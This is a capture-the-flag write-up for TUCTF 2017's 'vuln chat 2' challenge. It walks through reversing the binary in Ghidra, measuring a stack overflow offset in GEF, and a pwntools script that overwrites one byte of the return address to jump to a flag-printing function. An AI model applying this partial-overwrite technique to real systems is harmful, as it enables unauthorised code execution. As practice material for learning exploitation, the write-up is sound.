# Tuctf 2017 vuln chat 2

The goal for this challenge is to print the contents of `flag.txt`, not pop a shell.

Let's take a look at the binary:

```
$    file vuln-chat2.0
vuln-chat2.0: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=093fe7a291a796024f450a3081c4bda8a215e6e8, not stripped
$    pwn checksec vuln-chat2.0
[*] '/Hackery/pod/modules/partial_overwrite/tuctf17_vulnchat2/vuln-chat2.0'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$    ./vuln-chat2.0
----------- Welcome to vuln-chat2.0 -------------
Enter your username: guyinatuxedo
Welcome guyinatuxedo!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: You've proven yourself to me. What information do you need?
guyinatuxedo: 15935728
djinn: Alright here's you flag:
djinn: flag{1_l0v3_l337_73x7}
djinn: Wait thats not right...
```

So we can see we are dealing with a `32` bit binary, with a Non-Executable stack. When we run it, we see it first prompts us for a username. After that it prompts us for information we need. After that it prints a flag, but it isn't the one we need.

## Reversing

When we look at the main function in Ghidra, we see this:

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0x14);
  doThings();
  return 0;
}
```

So we can see here, it essentially just calls `doThings`:

```

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void doThings(void)

{
  undefined inp1 [20];
  undefined inp0 [15];
 
  puts("----------- Welcome to vuln-chat2.0 -------------");
  printf("Enter your username: ");
  __isoc99_scanf(&DAT_08048798,inp0);
  printf("Welcome %s!\n",inp0);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: You\'ve proven yourself to me. What information do you need?");
  printf("%s: ",inp0);
  read(0,inp1,0x2d);
  puts("djinn: Alright here\'s you flag:");
  puts("djinn: flag{1_l0v3_l337_73x7}");
  puts("djinn: Wait thats not right...");
  return;
}


```

We can see that the value of `DAT_08048798` is `%15s`:

```
                             DAT_08048798                                    XREF[2]:     doThings:0804858f(*),
                                                                                          doThings:08048595(*)  
        08048798 25              ??         25h    %
        08048799 31              ??         31h    1
        0804879a 35              ??         35h    5
        0804879b 73              ??         73h    s
        0804879c 00              ??         00h
```

So we can see it essentially prompts us for input twice (in addition to printing out a lot of text). The first time it prompts us for input, it scans in `15` bytes worth of data into `inp0`, which holds `15` bytes worth of data (no overflow here). The second scan scans in `0x2d` bytes worth of data into `inp1` which holds `20` bytes of data, so we have an overflow. Let's see what the offset is from the start of our input to the saved return address is:

```
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1f      
$ebx   : 0x08049b08  →  0x08049a18  →  0x00000001
$ecx   : 0xf7fb7010  →  0x00000000
$edx   : 0x1f      
$esp   : 0xffffd0c0  →  0x08048870  →  "djinn: Wait thats not right..."
$ebp   : 0xffffd0ec  →  0xffffd0f8  →  0x00000000
$esi   : 0xf7fb5000  →  0x001dbd6c
$edi   : 0xf7fb5000  →  0x001dbd6c
$eip   : 0x08048635  →  <doThings+218> add esp, 0x4
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd0c0│+0x0000: 0x08048870  →  "djinn: Wait thats not right..."     ← $esp
0xffffd0c4│+0x0004: 0x393531f8
0xffffd0c8│+0x0008: 0x32373533
0xffffd0cc│+0x000c: 0xffff0a38  →  0x00000000
0xffffd0d0│+0x0010: 0x08049b08  →  0x08049a18  →  0x00000001
0xffffd0d4│+0x0014: 0xf7fb5000  →  0x001dbd6c
0xffffd0d8│+0x0018: 0x79756700
0xffffd0dc│+0x001c: "inatuxedo"
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048625 <doThings+202>   inc    DWORD PTR [ebx-0x7c72fb3c]
    0x804862b <doThings+208>   push   0x50ffffed
    0x8048630 <doThings+213>   call   0x8048400 <puts@plt>
 →  0x8048635 <doThings+218>   add    esp, 0x4
    0x8048638 <doThings+221>   mov    ebx, DWORD PTR [ebp-0x4]
    0x804863b <doThings+224>   leave  
    0x804863c <doThings+225>   ret    
    0x804863d <main+0>         push   ebp
    0x804863e <main+1>         mov    ebp, esp
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln-chat2.0", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048635 → doThings()
[#1] 0x8048668 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffd0c5 - 0xffffd0cd  →   "15935728[...]"
gef➤  i f
Stack level 0, frame at 0xffffd0f4:
 eip = 0x8048635 in doThings; saved eip = 0x8048668
 called by frame at 0xffffd100
 Arglist at 0xffffd0ec, args:
 Locals at 0xffffd0ec, Previous frame's sp is 0xffffd0f4
 Saved registers:
  ebx at 0xffffd0e8, ebp at 0xffffd0ec, eip at 0xffffd0f0
```

So we can see that the offset is `0xffffd0f0 - 0xffffd0c5 = 0x2b`. Since our input is `0x2d` bytes, this means we can overwrite `0x2d - 0x2b = 0x2` bytes of the saved return address.

Also we can see that there is a function at `0x8048672` called `printFlag`, that if we call it we will get the flag:

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void printFlag(void)

{
  puts("Ah! Found it");
  system("/bin/cat ./flag.txt");
  puts("Don\'t let anyone get ahold of this");
  return;
}
```

## Exploitation

So we will be doing a partial overwrite. In this case, we will only be overwriting the least significant byte of the return address. When we looked at the saved return address, we saw that it was equal to `0x8048668`. The function we are trying to call (`printFlag`) is at `0x8048672`. Since the only difference between the two addresses is the least significant byte (which we will overwrite to be `0x`72), we only need to overwrite that to call `printFlag`.

Also even though we don't have to deal with address randomization in this challenge thanks to there not being PIE, a lot of the time that is where partial overwrites come in handy. That is because since the base address usually ends in a null byte (or multiple) the randomization doesn't apply to the lower bytes. So if we overwrite the lower bytes, it gives us a range that we can jump to without an infoleak.

## Exploit

Putting it all together, we have the following exploit:

```
#Import pwntools
from pwn import *

#Establish the target
#target = process('vuln-chat2.0')
target = remote('vulnchat2.tuctf.com', 4242)

#Print out the text up to the username prompt
print target.recvuntil('Enter your username: ')

#Send the username, doesn't really matter
target.sendline('guyinatuxedo')

#Print the text up to the next prompt
print target.recvuntil('guyinatuxedo: ')

#Construct the payload, and send it
payload = `0`*0x2b + "\x72"
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

When we run it:

```
$    python exploit.py
[!] Could not find executable 'vuln-chat2.0' in $PATH, using './vuln-chat2.0' instead
[+] Starting local process './vuln-chat2.0': pid 10483
----------- Welcome to vuln-chat2.0 -------------
Enter your username:
Welcome guyinatuxedo!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: You've proven yourself to me. What information do you need?
guyinatuxedo:
[*] Switching to interactive mode
djinn: Alright here's you flag:
djinn: flag{1_l0v3_l337_73x7}
djinn: Wait thats not right...
Ah! Found it
flag{g0ttem_b0yz}
Don't let anyone get ahold of this
[*] Got EOF while reading in interactive
```

Just like that, we got the flag!